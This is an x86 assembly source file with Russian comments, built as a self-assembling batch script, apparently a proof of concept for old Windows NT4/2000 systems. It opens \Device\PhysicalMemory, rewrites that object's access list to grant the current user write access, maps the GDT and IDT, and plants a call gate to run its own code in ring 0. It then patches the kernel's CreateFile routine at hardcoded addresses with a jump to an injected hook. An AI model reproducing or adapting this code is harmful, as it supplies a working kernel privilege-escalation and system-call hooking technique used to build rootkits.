;@GOTO -)
.586P
.MODEL FLAT
UNICODE=0
NT4=1
NT5=0
OSVER=NT5                 ; Версия опер ционной системы в в шем случ е ...
INCLUDE WINDOWS.inc       ;
INCLUDE APIMACRO.mac      ;
INCLUDE NtStruc.inc       ;
INCLUDE Secrty.inc        ;
INCLUDELIB iKERNEL32.lib  ; Если с этим возникнет проблемк  
              ; см. здесь http://members.nbci.com/_XMCM/elicz/infos/EliASM2.zip

  xDT         STRUC       ; Структур  описыв ет GDTR & IDTR
   Limit      WORD ?      ;
   Base       DWORD ?     ;
  xDT         ENDS        ;

  R0CSNT     = 08H        ; Кодовый дескриптор НТ-ки для ring0

.DATA?
   GetSecurityInfo  DWORD ? ; Процедурки с  ADVAPI32.dll
   SetEntriesInAcl  DWORD ? ;
   SetSecurityInfo  DWORD ? ;

   hSection   DWORD ?               ; Handle секции
   phSection  EQU   OFFSET hSection ; Ук з тель н  этот Handle секции

   SectionGDT DWORD ?               ; Здесь мы хр ним секцию с GDT
   SectionIDT DWORD ?               ; a здесь с  IDT

   GDTstart   DWORD ?
   GDTend     DWORD ?
   ReturnEIP  DWORD ?
   OrigDesc   QWORD ?
               WORD ?

   GDT        xDT   <>
   IDT        xDT   <>

.CODE

; Объект который используется для открытия секции
oa OBJECT_ATTRIBUTES <                  \
                      OBJECT_ATTRIBUTES,\  ;Length_
                                      0,\  ;RootDirectory
                                PhMemUS,\  ;ObjectName
                   OBJ_CASE_INSENSITIVE,\  ;Attributes
                                   NULL,\  ;SecurityDescriptor
                                   NULL \  ;SecurityQualityOfService
              >
poa EQU OFFSET oa                          ; Pointer to oa


PhMemUS UNICODE_STRING <                \
                          LzPhMem*WCHAR,\
              LzPhMem*WCHAR,\ 
                szPhMem \
            >

; Стуктур  описыв ет доступ к объект м
ExplicitAccess  EXPLICIT_ACCESS < SECTION_MAP_WRITE,\ 
                                     GRANT_ACCESS,\
                                   NO_INHERITANCE,\
                                     <NULL,\
                                   NO_MULTIPLE_TRUSTEE,\ 
                                       TRUSTEE_IS_NAME,\
                                       TRUSTEE_IS_USER,\ 
                                              ststName \
                    >\
                                  >

   TEXTW    zPhMem, <\Device\PhysicalMemory>

   TEXT     tstName,<CURRENT_USER/0>

   pExplicitAccess  EQU OFFSET ExplicitAccess

   TEXT     zADVAPI32,        <ADVAPI32.dll/0>
   TEXTA    zGetSecurityInfo, <GetSecurityInfo/0>
   TEXTA    zSetEntriesInAcl, <SetEntriesInAclA/0>
   TEXTA    zSetSecurityInfo, <SetSecurityInfo/0>

   TEXT     zNTDLL,           <NTDLL.dll/0>
   TEXTA    zNtOpenSection,   <NtOpenSection/0>
;----------------------------------------------------------------------------------
  xHandler:
   MOV      ECX, [ESP+12]
   MOV      EDX, [ESP+8]
   ADD      ECX, CONTEXT.regEip
   SUB      EAX, EAX
   MOV      [ECX][CONTEXT.regEip-CONTEXT.regEip], xExit
   MOV      [ECX][CONTEXT.regEsp-CONTEXT.regEip], EDX
   RET
;--------------------------------------------------------------------------------------------
 SetSectionSecurity PROC USES EBX ESI EDI
   LOCAL    pDacl :DWORD
   LOCAL    pSD   :DWORD

   SUB      EBX, EBX
   LEA      ESI, pDacl
   LEA      EDI, pSD

   PUSH     -1    ;assume non ERROR_SUCCESS result

   sWin32   GetSecurityInfo, hSection, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION,\
                             EBX, EBX, ESI, EBX, EDI
   TEST     EAX, EAX
   MOV      [ESP], EAX
   JNE      CantOpen
  
   PUSH     EAX
   sWin32   SetEntriesInAcl, 1, pExplicitAccess, pDacl, ESP
   POP      ESI
   TEST     EAX, EAX
   MOV      [ESP], EAX
   JNE      CantSet

   sWin32   SetSecurityInfo, hSection, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION,\
                             EBX, EBX, ESI, EBX
   MOV      [ESP], EAX
   iWin32   LocalFree, ESI
  CantSet:
   iWin32   LocalFree, [EDI]
  CantOpen:
   POP      EAX
   RET
 SetSectionSecurity ENDP
;----------------------------------------------------------------------------------------------
 QuasiMmGetPhysicalAddress PROC VirtualAddress, mSize
   MOV      EAX, VirtualAddress
   MOV      ECX, EAX
   AND      ECX, 000000FFFH    ;offset
   CMP      EAX, 080000000H
   JB       CantGetPhysical
   MOV      EDX, mSize
   ADD      EDX, EAX
   CMP      EDX, 0A0000000H
   JAE      CantGetPhysical
   CMP      EDX, VirtualAddress
   JB       CantGetPhysical
   AND      EAX, 01FFFF000H   ;physical address (page aligned)
   RET      
  CantGetPhysical:
   AND      EAX, 000FFF000H   ;guess it
   GuessPhysical EQU DWORD PTR $-4
   RET      
 QuasiMmGetPhysicalAddress ENDP
;----------------------------------------------------------------------------------------------
 PrepareMemory PROC Base, Limit
   sWin32   QuasiMmGetPhysicalAddress, Base, Limit
   MOV      EDX, Limit
   INC      EDX
   AND      DL, NOT 7  ;QWORD alignment
   RET
 PrepareMemory ENDP
;----------------------------------------------------------------------------------------------
 BringMemoryNT PROC Address, mSize
   iWin32   MapViewOfFile, hSection, ExplicitAccess.grfAccessPermissions, 0, Address, mSize
   RET
 BringMemoryNT ENDP
;----------------------------------------------------------------------------------------------
 FreeMemoryNT  PROC
   iMOV     EBX, UnmapViewOfFile
   sWin32   EBX, SectionGDT
   sWin32   EBX, SectionIDT
   iWin32   CloseHandle, hSection
   RET
 FreeMemoryNT  ENDP
;----------------------------------------------------------------------------------------------
 PrimaryThread:
   ASSUME   FS:NOTHING           ;  Н стройк  своего перехв тчик 
   SUB      EAX, EAX             ;  ошибок
   PUSHp    xHandler, FS:[EAX]   ;
   MOV      FS:[EAX], ESP        ;

   SGDT     GDT                   ; Получ ем содержимое GDT и IDT
   SIDT     IDT                   ;

   iMOV     ESI, GetProcAddress         ; Получ ем  дрес  
   iWin32i  LoadLibrary, szADVAPI32     ; GetSecurityInfo
   TEST     EAX, EAX                    ; SetEntriesInAcl
   JE       CantGetSection              ; SetSecurityInfo
   MOV      EBX, EAX                    ;
   sWin32   ESI, EBX, szGetSecurityInfo ;
   TEST     EAX, EAX                    ;
   MOV      GetSecurityInfo, EAX        ;
   JE       CantGetSection              ;
   sWin32   ESI, EBX, szSetEntriesInAcl ;
   TEST     EAX, EAX                    ;
   MOV      SetEntriesInAcl, EAX        ;
   JE       CantGetSection              ;
   sWin32   ESI, EBX, szSetSecurityInfo ;
   TEST     EAX, EAX                    ;
   MOV      SetSecurityInfo, EAX        ;
   JE       CantGetSection              ;

   iWin32i  GetModuleHandle, szNTDLL    ; Получ ем  дрес NtOpenSection
   TEST     EAX, EAX                    ;
   JE       CantGetSection              ;
   sWin32   ESI, EAX, szNtOpenSection   ;
   TEST     EAX, EAX                    ;
   JE       CantGetSection              ;
   MOV      EDI, EAX                    ;
   ; EDI=NtSectionOpen

   ; Открыв ем  \Device\PhysicalMemory
   sWin32   EDI, phSection, ExplicitAccess.grfAccessPermissions, poa
   TEST     EAX, EAX
   JGE      SectionOpened
   
    sWin32   EDI, phSection, READ_CONTROL OR WRITE_DAC, poa
    TEST     EAX, EAX
    JL       CantGetSection
    sWin32   SetSectionSecurity
    PUSH     EAX
    iWin32   CloseHandle, hSection
    POP      EAX
    TEST     EAX, EAX
    JNE      CantGetSection
    sWin32   EDI, phSection, ExplicitAccess.grfAccessPermissions, poa
    TEST     EAX, EAX
    JGE      SectionOpened
CantGetSection: 
   JMP      fExit

  SectionOpened:
   MapGDT:
   MOVZX    EAX, GDT.Limit
   sWin32   PrepareMemory, GDT.Base, EAX
   TEST     EAX, EAX
   JNE      @F
   JMP      MapIDT
  @@:
   PUSHp    ECX, EDX     ;offset, limit
   ADD      EDX, ECX     ;nbytes
   sWin32   BringMemoryNT, EAX, EDX
   TEST     EAX, EAX
   POPc     ESI, EDI     ;offset, limit
   JE       MapIDT
   MOV      SectionGDT, EAX

   ADD      ESI, EAX

   LEA      ECX, [ESI+EDI]
   MOV      GDTstart, ESI
   MOV      GDTend,   ECX

  MapIDT:
   MOVZX    EAX, IDT.Limit
   sWin32   PrepareMemory, IDT.Base, EAX
   TEST     EAX, EAX     ;page aligned address 
   JNE      @F
   JMP      SpecialActions
  @@:
   PUSHp    ECX, EDX          ;offset, limit
   ADD      EDX, ECX          ;nbytes
   sWin32   BringMemoryNT, EAX, EDX
   TEST     EAX, EAX
   POPc     ESI, EDI          ;offset, limit
   JE       SpecialActions
   MOV      SectionIDT, EAX
  SpecialActions:
  GoR0:
   MOV      EDI, GDTstart
   MOV      ESI, GDTend
   ADD      EDI, 8
  @@:
   CMP      ESI, EDI
   JBE      EmptyNotFound
   SUB      ESI, 8
   CMP      BYTE PTR [ESI+5], 0
   JNE      @B

   oLEA     EDI, OrigDesc
   PUSH     ESI
   PUSH     ESI
   MOVSD
   MOVSD
   POP      ESI
   MOV      EAX, R0Proc
   MOV      WORD PTR [ESI+2], R0CSNT
   MOV      WORD PTR [ESI], AX
   MOV      AX, 0EC00H
   MOV      [ESI+4], EAX
   SUB      ESI, GDTstart
   MOV      CallGSel, SI
 
            BYTE   9AH
            DWORD   ?
   CallGSel WORD   ?

   oLEA     ESI, OrigDesc
   POP      EDI
   MOVSD
   MOVSD
  EmptyNotFound:
  SkipR0:
  xExit:
   sWin32   FreeMemoryNT
  fExit:
   POP      FS:TEB.ExceptionList
   iWin32   ExitProcess
;--------------------------------------------------------------------
; Этот код будет выполняться в ring0
R0Proc  PROC
        CLI
        PUSHA
        CLD
        CALL BEEP
        IF OSVER
        MOV EDI,80000000H    
        ELSE
        MOV EDI,0FDF8A000H   
        ENDIF
        MOV ESI,OFFSET NewCreateFile
        MOV ECX,OFFSET NewCreateFileEnd - OFFSET NewCreateFile
        CLD
    REP MOVSB
    IF OSVER
        MOV EDI,80168E1EH ; Nt4CreateFile 
        ELSE
        MOV EDI,804A0C2DH ; Nt5CreateFile 
        ENDIF
    MOV AL,0E9H
    STOSB

        IF OSVER
    MOV EAX,80000000H
    SUB EAX,80168E1EH
    ELSE
    MOV EAX,0FDF8A000H   
    SUB EAX,804A0C2DH
    ENDIF
        SUB EAX,5
        STOSD 
        POPAD
        STI
        RETF
R0Proc    ENDP
R0ProcEnd:
;------------------------------------------------------------------------------
; Этот код ост нется  в п мяти 
NewCreateFile PROC        ; ORG 80000000H
              CALL BEEP
SAVECODE:     PUSH EBP
              XOR EAX,EAX
              MOV EBP,ESP

              DB  0E9H
              IF  OSVER
              LOCOFS EQU  offset JMP2CONTIN-offset NewCreateFile +168E1Eh - 21
              ELSE
              LOCOFS EQU 804A0C2DH - 0FDF8A000H +  offset JMP2CONTIN-offset NewCreateFile -21 
              ENDIF
JMP2CONTIN    DWORD  LOCOFS
NewCreateFile ENDP
BEEP PROC
        PUSHAD
        MOV     AX, 100
        MOV     BX, 100
        MOV     CX, AX
        MOV     AL, 0b6h
        OUT     43h, AL
        MOV     DX, 0012h
        MOV     AX, 34dch
        DIV     CX
        OUT     42h, AL
        MOV     AL,AH
        OUT     42h, AL
        IN      AL, 61h
        MOV     AH, AL
        OR      AL, 03h
        OUT     61h, AL
        l1:
        MOV     ECX,1680
        l2:
        LOOP    l2
        DEC     BX
        JNZ     l1
        MOV     AL, AH
        OUT     61h, AL
        POPA
        ret
BEEP ENDP
NewCreateFileEnd:
;--------------------------------------------------------------------
END PrimaryThread
:-)
@ECHO OFF
@del ml.log
@del ln.log
@ECHO Ассемблируем...
ML /c /coff /Gz /Cp /nologo R0RES.bat >ml.log
@ECHO Линкуем...
eLINK R0RES /IGNORE:4078 /nologo /SUBSYSTEM:CONSOLE /MERGE:.idata=.text /MERGE:.rdata=.text /SECTION:.text,EWR >ln.log
DEL   R0RES.obj
PAUSE
CLS
